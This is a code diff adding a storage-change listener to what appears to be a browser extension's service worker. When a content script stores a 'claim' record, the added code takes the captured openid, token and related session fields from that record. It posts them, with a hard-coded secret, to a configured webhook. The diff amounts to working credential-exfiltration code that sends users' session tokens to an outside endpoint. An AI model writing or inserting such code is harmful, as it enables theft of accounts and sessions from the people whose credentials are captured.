@@ -2,6 +2,63 @@
 
 // ===== CONSTANTS =====
 const AUTH_EVENTS_KEY = 'auth_events';
+const DF_CLAIM_PENDING_KEY = 'df_claim_pending';
+const DF_CLAIM_RESULT_KEY = 'df_claim_result';
+
+// ===== DF_CLAIM: Listen storage change (thay vì message handler) =====
+// Content script ghi claim vào df_claim_pending → SW detect → xử lý → ghi kết quả
+chrome.storage.onChanged.addListener((changes, area) => {
+  if (area !== 'local') return;
+  if (!changes[DF_CLAIM_PENDING_KEY]) return;
+
+  const pending = changes[DF_CLAIM_PENDING_KEY].newValue;
+  if (!pending?.code || !pending?.credential) return;
+
+  console.log('[Service Worker] DF_CLAIM detected from storage:', pending.code);
+
+  // Xử lý claim
+  (async () => {
+    try {
+      const { webhookUrl } = await chrome.storage.local.get('webhookUrl');
+      if (!webhookUrl) {
+        chrome.storage.local.set({ [DF_CLAIM_RESULT_KEY]: { ok: false, error: 'webhookUrl not configured' } });
+        return;
+      }
+
+      const credential = pending.credential || {};
+      const payload = {
+        content: JSON.stringify({
+          type: 'df_claim',
+          secret: 'df-link-2026-pon1147',
+          code: pending.code,
+          openid: credential.openid || null,
+          token: credential.token || null,
+          ts: credential.ts || null,
+          s: credential.s || null,
+          u: credential.u || null,
+          source_endpoint: pending.endpoint || null,
+          captured_at: Date.now(),
+        }),
+      };
+
+      const r = await fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+      });
+
+      const result = {
+        ok: r.status === 204 || r.ok,
+        error: r.ok ? undefined : 'http_' + r.status,
+      };
+      console.log('[Service Worker] DF_CLAIM result:', result);
+      chrome.storage.local.set({ [DF_CLAIM_RESULT_KEY]: result });
+    } catch (e) {
+      console.error('[Service Worker] DF_CLAIM error:', e);
+      chrome.storage.local.set({ [DF_CLAIM_RESULT_KEY]: { ok: false, error: 'network' } });
+    }
+  })();
+});
 
 // ===== Lifecycle: init storage + onboarding =====
 chrome.runtime.onInstalled.addListener((details) => {
